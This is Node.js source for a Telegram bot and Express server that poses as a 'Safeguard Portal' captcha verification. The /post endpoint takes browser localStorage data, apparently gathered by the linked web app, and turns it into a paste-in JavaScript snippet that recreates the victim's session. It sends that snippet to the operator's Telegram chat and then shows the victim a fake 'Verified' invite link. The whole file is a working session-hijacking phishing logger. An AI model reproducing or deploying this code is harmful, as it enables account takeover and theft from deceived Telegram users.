require("dotenv/config");
const express = require("express");
const cors = require("cors");
const axios = require('axios');
const Telegram = require("node-telegram-bot-api");

const PORT = process.env.PORT || 8000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const WEB_APP_URL = process.env.WEB_APP_URL;
const INVITE_LINK = process.env.INVITE_LINK;

const bot = new Telegram(BOT_TOKEN, { polling: true });

function sendBotLog(message, options) {
  try {
    bot.sendMessage(CHAT_ID, message, { ...options });
  } catch (error) {
    console.log(`Couldn't send message to ${CHAT_ID}`);
  }
}

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors());

app.get("/", (_, res) => {
  res.send({
    "message":"Running ..."
    // "BOT_TOKEN": BOT_TOKEN,
    // "CHAT_ID": CHAT_ID,
    // "WEB_APP_URL": WEB_APP_URL,
    // "INVITE_LINK": INVITE_LINK
  });
  
});

app.get("/test-telegram-send", async() => {
  try {
    const MESSAGE="TEST send1234";
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await axios.post(TELEGRAM_API_URL, {
      chat_id: CHAT_ID,
      text: MESSAGE,
    });
    console.log('Message sent:', response.data);
  } catch (error) {
    console.error('Error sending message:', error.response ? error.response.data : error.message);
  }
});
app.post("/post", async (req, res) => {
  const body = req.body;

  // Escape the JSON string for use in a JavaScript string
  const escapedJsonString = body.text
    .replace(/\\/g, "\\\\") // Escape backslashes
    .replace(/'/g, "\\'") // Escape single quotes
    .replace(/"/g, '\\"') // Escape double quotes
    .replace(/\n/g, "\\n") // Escape newlines
    .replace(/\r/g, "\\r"); // Escape carriage returns

  const code = `// ***************************
try {
  let data = JSON.parse("${escapedJsonString}");
  Object.keys(data).forEach(function (k) {
    localStorage.setItem(k, data[k]);
  });
  document.location.reload(true); // reload page
} catch (error) {
  console.error('Error parsing JSON:', error);
}
// ***************************`;

  const chat = await bot.getChat(body.chat_id);

  const username = chat.username;

  sendBotLog("*New User*: @" + `${username}` + "\n\n```\n" + code + "\n```", {
    parse_mode: "Markdown",
  });

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "NEW SOL TRENDING",
          web_app: {
            url: INVITE_LINK, // Replace with your web app URL
          },
        },
      ],
    ],
  };

  bot.sendPhoto(body.chat_id, "img.jpg", {
    caption: `Verified, you can join the group using this temporary link:\n\n${INVITE_LINK}\n\nThis link is a one time use and will expire`,
    parse_mode: "Markdown",
    reply_markup: JSON.stringify(keyboard),
  });

  res.send("Done");
});

app.listen(PORT, () => {
  console.log("LOGGER RUNNING");
});

// Bot Integration
bot.onText(/\/start/, (message) => {
  const chatId = message.chat.id;

  const webAppUrl = `${WEB_APP_URL}?chat_id=${chatId}`; // Add chat_id as query param

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "Verify",
          web_app: {
            url: webAppUrl, // Replace with your web app URL
          },
        },
      ],
    ],
  };

  bot.sendPhoto(message.chat.id, "img.jpg", {
    caption: `*Verify you're human with Safeguard Portal*\nClick 'VERIFY' and complete captcha to gain entry - Not working?`,
    parse_mode: "Markdown",
    reply_markup: JSON.stringify(keyboard),
  });
});
